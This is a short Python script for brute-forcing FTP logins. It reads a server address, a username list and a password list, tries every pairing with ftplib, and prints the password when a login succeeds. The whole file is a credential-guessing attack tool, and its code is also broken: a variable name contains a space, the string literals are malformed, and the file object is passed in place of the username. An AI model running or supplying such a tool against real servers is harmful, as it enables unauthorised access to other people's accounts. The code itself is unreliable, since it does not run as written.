#! /usr/bin/python3

import ftplib

server = input ("FTP Server: ")

userlist = input("Path to User List > ")

passwordlist = input("Path to Password List > ")

try:

	with open (passwordlist, 'r') as pw:

		for word in pw:

			word = word.strip('\\r').strip('\\n\\')

			try:

				with open(user list, 'r') as user:

					for name in user:

						name = name.strip('\\r').strip('\\n\\')

						ftp = ftplib.FTP(server)

						ftp.login(user, word)

						print("Success! The password is " + word)

			except:

				print("still trying...")

except:

	print("Wordlist error")
